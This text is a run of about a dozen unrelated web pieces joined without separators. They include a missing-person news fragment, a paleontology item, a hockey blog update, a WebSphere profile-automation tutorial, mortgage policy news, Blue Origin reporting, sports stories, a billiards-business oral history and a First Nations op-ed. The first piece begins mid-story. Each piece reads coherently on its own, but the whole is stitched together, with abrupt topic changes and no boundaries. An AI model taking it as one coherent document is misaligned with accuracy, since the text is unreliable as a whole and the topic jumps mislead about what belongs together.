Vaughan, a 32-year-old mother of children ages 9, 8 and 6 at the time she went missing, got into a fight with her husband, Jerry Ray Vaughan, at their home in La Vernia, the Express-News previously reported.
A witness reported seeing Patty Vaughan driving away in the family's van, which was found the next day on the shoulder of Loop 1604 just west of Highway 37. DNA tests confirmed that blood found in the van, in the Vaughans' bedroom and on a mop in the house was that of Patty Vaughan.
Jerry Ray Vaughan was questioned by sheriff's deputies but was never named a suspect.

Naming the fossil of an extinct pig-like swamp creature after Mick Jagger might not sound like much of a tribute to the aging rock 'n' roll star — unless it's an honor bestowed by scientists. Ellen Miller, an associate professor of anthropology at Wake Forest University, paid homage to the pouty-lipped Rolling Stones frontman by giving the scientific name Jaggermeryx naida, or “Jagger's water nymph," to the fossil of a large-lipped animal she and colleagues discovered. “I like the Rolling Stones,” Miller said in a news release issued by Wake Forest. “I'm a huge Stones fan.” The deer-sized creature lived 19 million years ago in Africa, and is described by researchers as something of a cross between a long-legged pig and a slender hippo. Miller was among a group of researchers who found several fossilized jaw fragments belonging to the animal at a remote site in the Egyptian desert. She is co-author of a paper detailing the discovery published in the September issue of the Journal of Paleontology. The creature belonged to a family of extinct hippopotamus-like mammals called anthracotheres.

It's been almost two weeks since I updated the blog. There are two reasons for that.
First, there's been no significant news to report. So don't worry, you're not missing anything. Second, I've been busy behind the scenes building out a brand-new section of the site — one that's here to stay.
Check out the new link in the nav bar at the of the page called Jerseys. That's the home of the new Jersey Gallery! Currently, two leagues are represented. I posted the NHL gallery a couple weeks ago and just added the AHL over the weekend!
A big difference between the two leagues is the number of specialty one-off jerseys worn in the American Hockey League. My plan at the moment is to include all of them in the gallery. But I count at least 75 worn this season alone so that may be more work than its worth.
Once the AHL gallery is squared away, the ECHL is up next — doubting any specialty jerseys there. After that, I'll tackle the Canadian Hockey League, including the WHL, OHL and QMJHL in that order.
As a bonus, I expect to add Icethetics' own fantasy league, the IceHL, this summer.
All this work should lead nicely into the fall where I'll have more galleries for each league heading into the new season. Whenever the opportunity presents itself, I fully intend on going into past seasons for these leagues, one year at a time.
It's a lot of work, but I've finally found a format I'm happy with for these jersey galleries — a feature of the site I've been trying to fine tune for several years now.
For now, take a look at the galleries that are up and let me know what you think!
As a developer that builds JEE applications that are deployed to IBM WebSphere application servers, I have spent a lot of time creating and configuring WebSphere application server profiles. There are several ways to automate the creation of a WebSphere server profile. The route I have chosen to take is a combination of leveraging built-in WebSphere scripts, server configuration archives and custom Jython scripts.
The package of sample scripts and configuration referenced throughout this article can be downloaded from this repository on GitHub.
Why would I want to automate this?
Why not? As a developer completing a repetitive process, you should always be thinking… is there a way to automate this process and make it repeatable? Aside from that, there are many specific reasons why you would want to automate the creation of WebSphere server profile including:
Reduce the amount of time it takes other developers to set up their workstation to run the application. Those who have worked with complex JEE applications running on WebSphere know it is not simple task to set up a new server profile, configure it and get your application running, especially when there is a lack of quality documentation about the application.
Create a quality source of documentation that describes the server configuration requirements your application requires to run. You can define server configurations in a Word document and attempt to keep that document in sync with your application server environment as it changes, but that is always a challenging thing to do. The best and most current source of documentation for how to set up your server environment should be your scripts, which would have to be updated every time there is a change to application server configurations.
Enable your continuous integration server to spin up new server instances on the fly without user intervention. If you are writing end-to-end integration tests for your application that run as part of your continuous integration, you may want to spin up a clean new application server instance each time (using the latest server configuration) before releasing your application. Scripting will enable you to do that.
Application Server Profiles in WebSphere
Developers who build JEE applications that are deployed on IBM WebSphere application servers are generally familiar with the concept of server profiles. Essentially a server profile is the definition of the application server that your application runs on. It includes all the server configurations that your application requires to run such as JDBC data sources, JMS queues, and system properties.
The concept of application server profiles has existed at least since WebSphere 6 and has been carried forward until at least WebSphere 8.5. Luckily many of the tools used to administer server profiles have not changed much through each release of WebSphere. During my initial experimentation, I found that many of the built-in scripts I used were available in WebSphere 7, 8 and 8.5. I also found that my custom Jython scripts were able to run on all three of these versions of WebSphere with little or no modification.
Server Profile Basics
Before diving into the automation process, there are a few key concepts and tools that you should understand including where server profiles actually reside on your computer. Generally all your server profiles are defined in a profiles directory wherever your WebSphere application server software is installed. The path to your WebSphere installation may differ depending on your selections during the installation process. You will need to know where your profiles are located. Here are some examples on a Windows machine:
WebSphere 7 – C:\Program Files\IBM\SDP\runtimes\base_v7\profiles
WebSphere 8 – C:\Program Files\IBM\WebSphere\AppServer\profiles
Useful Scripts and Commands
IBM provides a number of useful scripts that can be used via the command-line to manage your application server. These scripts are found in bin directory in the root of our WebSphere installation (ex. C:\Program Files\IBM\SDP\bin) or within the bin directory of your server profile (ex. C:\Program Files\IBM\SDP\runtimes\base_v7\profiles\bin). Open a command prompt in this directory and try some of the following commands. Note that many of the commands require you to specify the server profile you are dealing with since you can have multiple server profiles on your system.
To view a list of server profiles that have already been created:
manageprofiles -listProfiles
To delete a server profile:
manageprofiles -delete -profileName AppServer01
To start an application server:
startServer Server1 -profileName AppServer01
To stop an application server:
stopServer Server1 -profileName AppServer01
To backup the configuration of an existing server profile to a server configuration archive file:
backupConfig AppServer01.zip -profileName AppServer01
To restore a server configuration archive to an existing server profile:
restoreConfig AppServer01.zip -profileName AppServer01
Automating the Creation of the Server Profile
If you haven't already downloaded the script package, then you should do so now. Some snippets of the script will be shown below for demonstration purposes.
The primary script used to automate the creation of WebSphere server profile is a Windows batch script. This batch script invokes all the necessary commands to create a new server profile and apply your server's configuration settings. The script is divided into several steps each of which are described below.
Step 1 – Collect User Inputs
In order for the script to be portable, it prompts the user for inputs that could be unique depending on the machine it is being run on or the circumstances in which it is being run. For example, the script will prompt for:
An application prefix to use for naming the server profile itself as well as various components within the profile The installation path of WebSphere on the user's machine An option to start the server automatically after the profile has been created
After collecting user input, provides the user with a description of what will be created and allows the user to back out of the process. For example, creating a server profile with the application prefix “MyServer” would look something like this:
A server profile will be created using the following settings: - profile name: MyServerProfile - profile path: C:\Program Files\IBM\SDP_RAD9\runtimes\base_v7\profiles\MyServerProfile - cell name: MyServerCell - node name: MyServerNode - server name: MyServer
Step 2 – Create An Empty Server Profile
The next step is to create the user profile based on the user's inputs. The script makes use of the manageprofiles command provided by IBM to create the profile:
call %WAS_INSTALL_DIR%\bin\manageprofiles -create -profileName %PROFILE_NAME% -templatePath default -profilePath &quot;%PROFILE_PATH%&quot; -enableAdminSecurity false -cellName %CELL_NAME% -nodeName %NODE_NAME% -serverName %SERVER_NAME% -portsFile %APP_PREFIX%Ports.props -applyPerfTuningSettings development -isDeveloperServer -omitAction defaultAppDeployAndConfig
There are a number of switches used here to specify profile settings:
-profileName specifies the name of the profile to be created and is based on the user's input which was stored in the PROFILE_NAME variable
variable -templatePath specifies the name of the template to base the profile creation on; IBM provides several different server templates that could be used but I opted to use the default template
-profilePath specifies where the profile should be created; I opted to create the profile in the typical profiles directory within the WebSphere installation folder
-enableAdminSecurity is set too false to avoid requiring a username and password to log in to the administrative console from the browser
-cellName, -nodeName and -serverName specify names to be used for each of the respective scopes in the server profile and are generated based on the user-specified application prefix
-portsFile allows you to specify the various ports that your server profile will be run on including your HTTP, HTTPS and administrative console ports; refer to the AppServer01Ports.props file in the provided script package for an example
-applyPerfTuingSettings and -isDeveloperServer are set to indicate the server profile should be optimized for a developers machine
-omitAction specifies that the default applications and server configurations that IBM provides should not be applied to the server profile since I have no use for these and would like to keep the server profile as light as possible
Step 3 – Restore Server Configuration
This step is optional but may be required under certain circumstances. Essentially you can restore a server's configuration by restore a configuration archive file (sometimes referred to as a CAR file) or by restoring configuration from a properties file. There are benefits and limitations to both methods though.
Configuration Archives Files:
A configuration archive file is an archive file with a .zip or .car extension that is generated using IBM-provided scripts. The archive contains a backup of the configuration files in the server profile directory and can be used at a later point to restore the profile.
The configuration archive can be used to back up and restore nearly all server configurations (with some exceptions, see here).
In my experience, the configuration archive is not a fool-proof way of sharing server configurations. Within WebSphere 7 the configuration archive seemed to be portable across different developer's workstations however I did experience problems sharing a configuration archive for WebSphere 8.5.
The down-side to using a configuration archive is that your server configurations are buried within the server profile's XML files and not easily viewed or modified by a developer. Often times, the configuration archive is restored and then the developer has to login to the administrative console to make a number of changes to tweak the server's configuration for their purposes.
Server Configuration Properties File:
These properties file defines server configurations in a key-value pair format. A server profile's configurations can be dumped to one of these properties files using custom JACL or Jython scripts that invoke IBM-provided APIs.
There are certain limitations on which server profile configurations can actually get exported to a properties file.
There are several benefits to using a properties file instead of a configuration archive: Configuration is defined in a human-readable format and is self-documenting. Configuration can be modified prior to running the script. For instance, a developer may want to adjust certain system properties or endpoints to match their target development environment.
Ideally you would only want to restore server configurations from a properties file and avoid use of the server configuration archive method if possible. In my case, there were certain configurations that I simply could not restore using the properties file. For instance I was unable to successfully export and restore custom SSL configurations. For that reason, I have chosen to use both mechanisms in my script in the following manner:
First the configuration archive is restored onto the server profile. This acts as the “base” level of configuration and includes configurations that were not possible to restore using properties files. Secondly the server configuration properties file is applied to the server profile. These properties file acts as a “configuration override” and provides the developer with the ability to easily override whatever server configurations they need to override. For instance, different projects may have different properties files to support their specific development environments.
To restore the server configuration archive, the IBM-provided restoreConfig script is used:
call %PROFILE_PATH%\bin\restoreConfig %PROFILE_NAME%.zip -force -profileName %PROFILE_NAME%
To restore the server configuration properties file, the IBM wsadmin script is used along with a custom Jython script:
call %PROFILE_PATH%\bin\wsadmin -lang jython -conntype NONE -f applyConfig.py %PROFILE_NAME%.props
Step 4 – Start the Server
At this point, the server profile has been created and server configuration has been restored. All that is left to do is start the server:
call &quot;%PROFILE_PATH%\bin\startServer&quot; %APP_PREFIX%
Once the script completes, the administrative console can be accessed in the browser to verify that the server has started successfully and contains the restored server configurations. Typically, the WebSphere 7 administrative console is located at http://localhost:9060/ibm/console/login.doc although the port may vary depending on the ports you have configured in your script.
Potential Script Enhancements
These scripts could be further enhanced to improve the automation process, for example:
The process of exporting a server configuration archive and/or server configuration properties file from an existing fully configured server profile could be automated. I have provided an example of this in the sample scripts (refer to ExtractServerProfileConfig.bat).
The server configuration properties file is quite verbose and length. The effort required by a developer to modify configurations in this properties file could be reduced or eliminated by doing a few things: If you know there are only certain properties that need to be modified on the developer's workstation then you could prompt for these values during the first step of the CreateServerProfile.bat script then use the user's inputs to modify the properties file programmatically (for instance, using VBScript). If the sub-set of properties that could require modifications by a developer is substantial, you could create a second culled-down version of the properties file containing only those essential configurations. Within the CreateServerProfile.bat script, you could then first apply the larger, complete server configuration properties file followed by the culled-down version that was potentially modified by the developer. Remember that these properties files act as “overlay” files and can be used to modify the server profile's existing configurations.

Some first-time home buyers will get a break on their downpayments through programs announced Monday by mortgage giants Fannie Mae and Freddie Mac as the firms try to jump-start the housing market by making it easier for more borrowers to get a mortgage.
Fannie and Freddie will soon allow for mortgages with a downpayment as low as 3 percent – instead of the 5 percent currently required -- as long as one of the borrowers on the mortgage has not owned a primary residence within the past three years. The changes take effect Dec. 13 at Fannie, and March 23 at Freddie.
It's too early to tell how many borrowers will apply for these loans, Fannie and Freddie told reporters Monday. But they also said they expect many lenders to offer them. The Federal Housing Finance Agency, which oversees both companies, said these low downpayment mortgages will probably be a small share of both firms' overall businesses.
Since the FHFA first signaled its intent to change the downpayment policy, critics have cast the move as a return to the lax lending standards that contributed to the 2008 financial crisis. At the height of that crisis, the government took control of Fannie and Freddie and started pumping taxpayer money into the institutions to keep them solvent.
The companies and their regulator insist that they are in no way encouraging a return to the shoddy lending of the past. They say only creditworthy borrowers who take out plain-vanilla, fixed rate mortgages will qualify for the new programs, and all of them will be carefully vetted to make sure they can pay back the loans.
“These underwriting guidelines provide a responsible approach to improving access to credit while ensuring safe and sound lending practices,” Mel Watt, FHFA's director, said in a statement.
Fannie and Freddie do not make loans. They buy them from lenders, package them into securities and sell them to investors. For a fee, they guarantee the mortgages and pay investors if the loans default.
The companies and their regulator are now trying to do their part to help open up access to credit, particularly to low and moderate income borrowers. Since the housing market unraveled, lenders have turned away many potential buyers by demanding unusually high credit scores and imposing other harsh restrictions on government-backed loans.
As many as 1.2 million additional loans would have been made annually since 2012 if normal, pre-housing bubble lending standards had been in place, according to a recent analysis by the nonpartisan Urban Institute. The industry says it doesn't want to take any chances on people with less-than-stellar credit. After the housing bust, regulators forced lenders to buy back billions of dollars in loans, and the industry said it is merely trying to insulate itself from more financial penalties and lawsuits.
To allay the industry's concerns, Fannie and Freddie reached an agreement with lenders that would clarify the circumstances under which the industry is required to buy back loans. Fannie and Freddie, along with several industry experts, say that agreement has made lenders more receptive to the idea of granting 3 percent down loans.
“I'm confident that the majority of the lending community is going to take part in these programs,” said David H. Stevens, chief executive of the Mortgage Bankers Association. “They're more confident about the risks they face in extending these loans.”
These low downpayment loans will compete with the mortgages backed by the Federal Housing Administration, which requires at least 3.5 percent down. In some cases, the Fannie and Freddie loans will be cheaper because the fees on FHA loans have become very high
Both Fannie and Freddie had previously accepted 3 percent downpayment mortgages. Freddie stopped years ago, and it now insists that anyone who takes part in its new program must take borrower education classes. Freddie's initiative is also open to current homeowners of low and moderate income, as defined by the company's rules.Fannie stopped purchasing 3-percent down mortgages in late 2013 though it continued to buy them if they are made through state and local housing finance agencies.
Timothy Mayopoulos, Fannie's chief executive, has said his company's long experience with these loans shows that they perform well. The Urban Institute reached the same conclusion after analyzing low downpayment loans backed by Fannie in the recent past.
The analysis found that the default rate for loans with 3 percent to 5 percent down were very similar to the default rates on loans with 5 percent to 10 percent down. It also found that very few borrowers got the lower downpayment loans, and nearly all of those who did have top-notch credit.
Fannie and Freddie only buy loans with less than 20 percent down if they carry private mortgage insurance, so even if some of the 3 percent down loans were to default, taxpayers are not in line to take the first hit. The mortgage insurance companies are.
On Monday, Fannie also said it will allow borrowers to refinance their loans so that they cover up to 97 percent of their home's value under a limited cash-out option. (Previously, 95 percent was the cut off.) It will permit borrowers to pull enough cash out to help pay for the closing costs, either 2 percent of the loan amount or $2,000, whichever is less.
Hey there,I haven't been active on DA for a while, so I guess some explanations are in order. I've been working with developers "Ebb Software" on a horror/sci-fi game by the name of "Scorn". The project is very ambitious, and I had a task of creating hundreds of illustrations and concept sketches for the game. The world of "Scorn" is a skeletal hellscape of desperation and slow decay, inspired by dark, surreal work of H. R. Giger and Zdzislaw Beksinski. Creating a specific look required for this game was quite a challenge, and I'm thankful I got the opportunity to be a part of this. Working on "Scorn" made me reconsider my usual approach to creating characters and design in general. Getting out of my comfort zone and having to think in more abstract terms really kicked my ass in the best possible way.This is the link to the "Scorn" Kickstarter page, where you can learn more about the game.If this looks like something you'd like to play, please consider donating.Cheers!!!
Between November 2015, and October 2016, the reusable New Shepard rocket and spacecraft made five suborbital flights, surviving some pretty harsh scenarios. But during the last six months, Blue Origin, the semi-secretive rocket company founded by Jeff Bezos, has not flown any new vehicles. So what has it been up to?
This week, the company brought the rocket that made those five flights to the Space Symposium in Colorado Springs, Colorado and displayed it along with a mockup of the spacecraft that will eventually begin carrying customers on 11-minute suborbital flights. Bezos said he was not ready to disclose a price yet or sell tickets, but these consumer flights remain on track for sometime in 2018.
The original rocket has been retired and will likely go on a road show before ending up in a museum. To find out what has been happening behind the scenes with the second iteration of the New Shepard rocket, Ars spoke with Blue Origin President Rob Meyerson. He said the company's engineers have learned a lot of "little lessons" from the test flights of the New Shepard module in late 2015 and early 2016.
For example, the "ring fins" at the top of the vehicle, which help control its descent through the atmosphere, are part of the leading edge of the vehicle as it comes back to Earth. Originally, the company had applied ablative thermal protection to the bottom of these (the material can be seen browning over time in this descent video). "We had to go and repair that in between flights, and it was a pretty labor-intensive activity," Meyerson said, requiring dozens to hundreds of hours of sanding and smoothing. Blue Origin has since begun using a metallic panel to shield this area.
After making a few dozen fixes and modifications to the New Shepard system, Blue Origin is now building three operational propulsion modules and two crew capsules. A testing program will begin by "late summer or early this fall," Meyerson said. After uncrewed test flights, "test passengers" could be added early in 2018 before customer flights later in the year—if all goes as planned.
Big ambitions
During his remarks in Colorado, Bezos said he is selling about $1 billion in Amazon stock a year to finance Blue Origin, which has seen dramatic growth in its workforce during the last year. Blue Origin has also begun building a large complex in Florida to assemble its next rocket, New Glenn, which will have the capacity to lift 45 tons to low Earth orbit. Bezos estimated it will cost about $2.5 billion to develop New Glenn.
The rocket already has a couple of launch customers, and Blue Origin is close to completing one of its key elements, the BE-4 rocket engine. The company has shipped the first engine to its test facilities in west Texas, and a second engine is close to being shipped from Kent, Washington, Meyerson said. The company is working on pre-burner and powerpack tests and will begin full-scale tests soon. "We'll test it when we're ready," Meyerson said. "It could be weeks away, or a few months away."
Blue Origin has also responded to inquiries from the Trump administration's transition team, which early on signaled that it is interested in working with commercial companies to augment to NASA's exploration capabilities. In response to that, the company proposed the Blue Moon concept, a cargo-delivery service to the surface of the Moon, with the intent of building a permanently inhabited human settlement on the Moon.
Bezos believes that many of the industrial practices that pollute Earth should be moved off-world, and he envisions millions of people living in and working in space. To that end, he has identified the Moon as the next key step in human exploration, rather than reaching for Mars. "We really believe that success comes from not skipping steps," Meyerson said. "The Moon is a great place to demonstrate living in space." He added that Bezos has told NASA and the Trump administration that he's willing to invest substantially in a public-private partnership to make that happen.
Why Fastest U.S. College Mile Runner Won't Be Vying To Be NCAA Champ
Enlarge this image toggle caption Stephen Brashear/Red Box Pictures Stephen Brashear/Red Box Pictures
Last week, Izaic Yorks, a senior at the University of Washington, ran a mile in 3:53 — the fastest college mile ever by an American. The effort qualifies him for the Olympic trials this summer.
So why isn't Yorks running in the mile at this weekend's NCAA championships in Birmingham, Ala.?
Turns out, he had to make a decision: run that mile alone, or run with his team in the distance medley relay or DMR.
If he decided to run the mile race, he would have been required to run a preliminary round right before the DMR — compromising his team's shot at a national title.
Yorks recalls when his coach, Greg Metcalf, pulls him aside to ask what he thinks about running the mile race.
"I was just, no way. I want to do the DMR," Yorks replied. "That's what I told these guys I would do. And I'm gonna stick to that word."
Metcalf continues.
"I'm sitting in my office on Sunday, making our declarations," Metcalf says. "And I hit the 'scratch' button next to Izaic's name, next to 3:53, I think, 'Am I the biggest idiot of all time?'"
Maybe. But in a sport that so often celebrates individual glory, Yorks is not only very fast, he's also very loyal.
Update @ 12:08 p.m., March 13: The UW Men finished second in the DMR on Friday, less than a second behind Oregon.

From an interview with Gordon, David, Luke and Christine that has been edited.
Our business started in 1895 with Harry Evans Sr.
He moved from England to Adelaide in 1882 before moving to Coolgardie in Western Australia.
Australia was experiencing a gold rush which brought some of the most talented billiards players to the country. He built a reputation as a professional player and competed in many tournaments.
While in Coolgardie Harry Evans tutored the father of one of the world's greatest ever players, Walter Lindrum. Harry moved to Melbourne in 1884. He played a billiards competition and won an exhibition sized table plus prize money two years in a row.
He subsequently decided to open a billiards shop – focusing on general maintenance – before his son Harry Jr took over.
The shop started in Little Collins St before moving to Elizabeth St.
The business spent the depression years in that area until Harry Jr's sons Gordon and Norm went off to the Second World War, which prevented the business from running.
On their return the business secured a big government contract for the army – to supply 20 full sized tables – which was a big deal at the time, and took us all over the country. They went to Wodonga, Albury, Puckapunyal and other army barracks up there.
In 1951 Gordon and Norm were almost able to buy the Gertrude street building. At the time the banks weren't lending money, so they acquired a personal loan from a man who ran a fish store in the Victorian market. Harry Sr met the businessman at the market and made the deal.
Moving to Gertrude St. the business started building tables in a more progressive way.
When we bought this place from Johnson Furniture it was derelict.
It was filthy and had no bathroom or toilet.
There were 14 squatters living in the building at the time and back then they had rights.
So we bought a house in Collingwood and said to them, “if you continue the mortgage payments the house is in your name and you can have it.”
From there the company grew into a large business. At one stage there were two factories and 16 employees, but it became too much work to keep it going.
We downscaled, and we've been happy as a smaller business.
In 1969 we bought a little business which made reproduction furniture.
It was in a little cul-de-sac in the centre of a north Fitzroy housing block.
The factory had a nice workshop with different machines and four tradesmen came with the business.
Unfortunately Norm died of cancer in 1979, and we had to sell that place. But we moved a lot of the machines from there and put them in here.
So that business really worked out well for us.
A lot of the work we do is repairing and restoring antique tables.
We completely strip back and re-polish the timber work, re-rubber and recover the cushions and sew on new nets and leathers. The process is hard work. You've just got to keep sanding until your fingers bleed. Then we knock off and do something else.
When we build our new tables we still use the same traditions. We fully house and bolt the leg frames from solid timber, not craft-wood. Then we go through the process of marrying the slates to the leg frame.
Marrying the slates to the leg frame requires setting the slate on the frame, rubbing it on the frame to find the high spots, then lifting it off to plane away the high spots with a hand-plane.
When you have enough contact area – and that particular slate is level – you put the next one on and repeat. It takes a long time and it's hard on your back. Once you've done that, you have to make the cushions which are bolted to the side of the table.
We don't make too many tables a year because they're all handmade and high quality.
This slideshow requires JavaScript.
Over the years some of our techniques and methods have expanded to incorporate new machinery.
This doesn't mean we've changed.
We still maintain all of our traditional skills.
Some of these tables are over 100 years old so we have to use 100-year-old methods to restore them.
And, when we sell a table people often ask if we are good players, and challenge us to a game.
“Ok, we'll play you double or nothing for the price of the table,” is often our reply.
This is a large bet so people make the assumption that we are good.
But nobody has taken the challenge.

During the depression and after the war, a lot of billiard rooms were opened.
People were looking for things to do instead of sitting around at home – and most people couldn't afford TV's – so billiards and snooker halls were a popular source of entertainment. When money was tight and everyone was struggling the billiard rooms were usually full.
But now we're dealing with the pokies. People still want to play the game, but they aren't many buildings or houses with rooms big enough to put tables in. That, or the rent for rooms is too high.
So there's hardly any billiard rooms left now. There's a few clubs and RSLs but a lot of those have taken the tables out, and put pokies in. You can put 10 or 12 machines in and the amount of money those machines can generate for the hotel is many times that of a pool table.
And there's been a remarkable amount of change that's happened around here. Gertrude St. is quite nice now but – at one point – it was pretty seedy and you didn't feel comfortable.
I don't really know how we managed to survive and create a business here.
I wouldn't come in if I didn't enjoy this.
It's the sort of business where we make things that people get enjoyment out of, and I get a lot of enjoyment out of making it for them.
I have quite a large family. I have five children, and my wife just turned 90. We recently had a party, and 42 of my immediate family turned up.
We've worked from my grandfather right through to my grandson, so that gives a sense of belonging. We run it as a family business.
That's the way it will be.

It seems Cesc Fábregas's Barcelona DNA, something mentioned from sources at the Camp Nou on a repetitive basis, has mutated. While nobody would dispute that the Catalan midfielder has his hometown club in his blood, it is indisputably mixed with red and white cells of a different kind.
Fábregas, whose all-round display shimmered, pledged his affection for Arsenal after scoring with a graceful volley. He smothered the badge on his shirt with a kiss. "There's always speculation I don't like it here but I am committed to this club 100 per cent," he said. "It's my seventh season and it's hard to hear people say they think I'm not committed enough. It was a good time to show them I really love this club."
Considering this all took place in front of Thierry Henry, who made a pre-match appearance with a regal wave before settling down with his daughter to watch the goalfest, Fábregas's clarification was useful. If you did not know better, you could have sworn the Arsenal captain was trying extra hard to put on a good show to ensure Henry returned to the Camp Nou with a sparkling scouting report.
As it is, Henry witnessed a display that justifies Arsenal's reputation as Barcelona-lite. The football was at times exquisite. The goals were beautifully worked. The defence was an afterthought. Alex Song had a job and a half on his hands considering every other player on his team outside the back four and goalkeeper had an aversion to being inside their own half.

With that in mind Blackburn's contribution, especially in a first half that was spectacularly open, was notable. They took the lead when Paul Robinson launched a free-kick from his own half as far as the opposing penalty area, where Steven Nzonzi – easily Blackburn's tallest player in the absence of the injured Christopher Samba – beat Thomas Vermaelen in the air to nod a looping header over Vito Mannone.
Vermaelen was evidently seething about being thoroughly outmanoeuvred. He cantered forward, was fouled by Brett Emerton, dusted himself down, and seized a pass from Fábregas to thump a 25-yarder into the bottom corner. Talk about channelling your anger positively. Vermaelen was so psyched up he almost popped a vein.
Now it was Blackburn's time to react. David Dunn barged into Mannone to show he was not about to take things lightly and, when the ball arrived to him in the area,, after solid approach work from El Hadji Diouf and Emerton, he trotted past William Gallas to shoot in off the French defender's heel.
Before Blackburn had a chance to settle, the see-saw tipped back thanks to Fábregas's mastery of the assist, which prompted two goals in four minutes. Robin van Persie and Andrey Arshavin were the grateful recipients.
Sam Allardyce knew Blackburn would have chances to claw their way back, given the vast spaces Arsenal leave uncovered. Martin Olsson produced a terrific volley that Mannone parried well and David Hoilett was unfortunate when Vermaelen glanced his effort on to a post.
But the major beef came just after the break, when Dunn was denied a penalty, having been tripped by Vermaelen. "It is a blatant one," said Allardyce. "This is why I am into pushing for technology because, if I am given the opportunity to challenge two or three decisions a game, I could challenge that one and we could have a chance to get some points out of Arsenal. We have been denied that chance and when Fábregas gets that fourth goal we end up looking like, well we are, a well-beaten side.
"You have got to get the major decisions right, otherwise you don't stay in this league too long, not as a manager or a player, so as a referee you have got to be judged the same. They are fully professional now, so if they are not good enough, we should find someone who is."
Fábregas, who could have had a hat-trick, gave Arsenal breathing space, from which the substitutes profited. Theo Walcott made the watching Fabio Capello's day when he scored with one of his first touches of the season, clipping home after another dinked touch from Fábregas helped Arshavin's cross into his path. Then Nicklas Bendtner showed no ill effects of his car crash when he dribbled infield to wallop the sixth past Robinson, who was unfortunate to go home with such a beating to digest, considering he had kept out at least as many again.
This, the only goal not involving Fábregas, occurred when he was off the field. Thrilled as Arsène Wenger was with his talisman, he was keen to share the plaudits around. "When we are confident we have a flow that looks like the goals will come at any moment and from anywhere. There is something in the side that is lighthearted and enjoyable to watch. Why? Because they enjoy to play together and that for me is the most important."
Would Henry have even got a game in this team? "He would," said Wenger.
"And he would have scored certainly."
"The show is now only surviving based upon the passion of our fans," Jackson tells THR.
As Fringe nears the end of season 4, what exactly does the future hold?
"The story as it finishes this year is really the ending of the story that was introduced in the first season, as much as it is the ending of this year's chapter of the show," Josh Jackson told The Hollywood Reporter at the Television: Out of the Box exhibit opening at Paley Center on Thursday evening.
Of course, Jackson was light on details, but perhaps the parties involved may shine a light to future events. "But I can't tell you anything about it because if I tell you who's involved in it, it will give it away," he answered with a glint in his eye.
Jackson also talked about joining the Twitter world ("It's a bit full-on, it's quite a lot") and the interaction he's had since and admitted that Fringe's survival rests on the social media fervor that takes place Friday nights at 9 p.m. when the show airs.
"The show is now only surviving based upon the passion of our fans," he says, "because we don't have a large audience or large viewership but the people who do watch it are incredibly fired up about it."
Watch the video above to see what Jackson had to say about a recent episode that he was impressed by.
Fringe airs Fridays at 9 p.m. on Fox.
The dispute over the North Dakota Access pipeline has been resolved, but the months-long protest by the Standing Rock Sioux has already served as a beacon to First Nations of Canada feeling the aggravation of their accumulated injuries — the Missing and Murdered Indigenous Women and Girls, Laloche, Val d'Or, Grassy Narrows, the Site C Dam, the Trans Mountain pipeline — and for this Canada has only itself to blame. We take far too many of our political cues from the United States, but need not solutions. We are an open, imaginative country still. This week's meeting in Gatineau, Qué., of the Assembly of First Nations is an opportunity for more than embraces. Here, then, is a simple five-point plan for addressing a challenge to Canada more grievous and innate than any posed from down south, proposals intended as an adjunct to the 94 recommendations of the Truth and Reconciliation Commission's report.
Assembly of First Nations Chief Perry Bellegarde speaks with Indigenous and Northern Affairs Minister Carolyn Bennett before the start of the Assembly of First Nations Special Chiefs assembly in Gatineau, Quebec on Tuesday. Noah Richler writes that the chief of the AFN should be a de facto member of the federal cabinet. ( Adrian Wyld / THE CANADIAN PRESS )
1. Adopt the UN Declaration on the Rights of Indigenous Peoples. This is a problematic document but one that provides solutions to the challenges of balancing indigenous rights and state sovereignty in its final clauses. In truth, it is a very Canadian charter, its guiding principles entirely compatible with our own. Let Canada take it on and, through practice, improve it. 2. Make the chief of the Assembly of First Nations a de facto member of cabinet. The next Governor-General is likely to be indigenous but this measure, note, is absolutely not about ceremony. A minister does not need to be a sitting MP, so let the chief of the Assembly of First Nations (with accommodation for Inuit and Métis) into the room as a peer and a participant. First Nations will be consulted on everything from housing to defence and procurement. Make the “nation to nation” relationship more than the stuff of costume and rhetoric. 3. Make the use of select First Nations languages in Parliament a right. Our two “official” languages, French and English, are spoken on the floor of the House of Commons and let this status be extended to Cree, Inuktitut and either Ojibwe or one of the Salish group of languages, the ones most broadly spoken and positioned for survival. Some provincial legislatures and courts already allow this and not to do so in Ottawa denies our communality and heritage. Language is the vessel of a culture and imagine, beyond any questions of fairness, how inspiring this would be to First Nations youth, in particular.

4. Make the completion of a course in aboriginal studies a mandatory requirement to matriculate from high school. Education falls under provincial jurisdiction, but this cannot be an excuse for federal inaction on so vital an issue. Such courses might teach language, indigenous arts or systems of native justice, these taught alongside the historical knowledge of residential schools that, regardless, should be a necessary part of the ordinary high school curriculum. The aboriginal studies requirement would provide acquaintance in a land where the gift of abundant space means Canadians never actually have to meet unless a concerted effort is made; it would advance scholarly rather than politically correct discussions of indigenous issues, and provide tens of thousands of meaningful well-paid jobs elevating not just the native sense of self. 5. Create and enforce a commons law uniting trails, reserves and national parks. Canada is in dire need of a commons law, variants of which exist in the United Kingdom, New Zealand and Norway. Protecting not just native but all Canadians' rights to share and learn the land is an opportunity that will imminently be lost and that First Nations are in a powerful position to defend. Making reserves a part of this system is not to detract from the rights of First Nations but to recognize common interests of the panoply of Canadian peoples. A working example of this kind already exists in the functioning of the Torngat Mountains National Park in Newfoundland and Labrador, jointly administrated by Parks Canada and Inuit who have lived within its boundaries for thousands of years. Entitled property owners and resource companies will resist such a law, of course, while thinking progressively on this score will prevent conflicts such as the one happening in North Dakota that could as easily happen here.
Let the country act boldly and in league with indigenous peoples, to who we owe ways of being as much as royalties and reparations. The alternative is our own Standing Rock.

After a heartbreaking, tear-jerking, last-second loss to the Seattle Seahawks last Sunday, the Minnesota Vikings and their fan base have struggled to remain calm. They swore and they sobbed, they pointed their collective finger at kicker Blair Walsh, and then they left it up to a bunch of first graders to help the devastated kicker feel better.
One fan, however, was apparently so distraught over last Sunday's outcome that he forgot to sell his ticket to what would've been his team's NFC Divisional Playoff Game this Saturday. You know, the game in Arizona.
This guy.

That's right -- these Vikings fan apparently paid for, showed up at and thus far has sat through a good portion of a playoff game that does not feature his Vikings. And he did it in full Vikings gear.
He was apparently also too distraught to catch the typo on his sign. We'll let that slide, though, considering the emotional roller coaster he's experienced throughout this sad, sad week in Minnesota history.

